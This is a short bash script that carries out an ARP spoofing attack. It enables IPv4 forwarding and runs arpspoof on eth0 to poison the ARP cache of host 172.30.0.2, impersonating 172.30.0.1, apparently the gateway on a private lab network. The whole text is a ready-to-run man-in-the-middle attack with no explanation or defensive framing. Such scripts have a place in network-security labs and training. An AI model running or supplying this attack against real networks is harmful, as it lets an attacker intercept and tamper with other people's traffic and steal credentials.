#!/bin/bash

echo "[*] Starting ARP spoofing..."
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 172.30.0.2 172.30.0.1
